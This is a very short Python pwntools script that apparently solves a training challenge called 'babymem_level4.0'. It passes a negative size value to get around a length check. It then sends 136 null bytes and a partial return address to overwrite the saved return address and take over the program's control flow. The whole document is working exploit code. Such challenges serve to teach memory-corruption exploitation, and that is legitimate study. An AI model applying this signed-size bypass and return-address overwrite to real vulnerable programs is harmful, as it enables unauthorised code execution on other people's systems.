import pwn
r = pwn.process("/challenge/babymem_level4.0")
r.sendline("-111")
r.send(b'\x00'*136+b'\xe0\x1f\x40') #41+
print(r.readall())
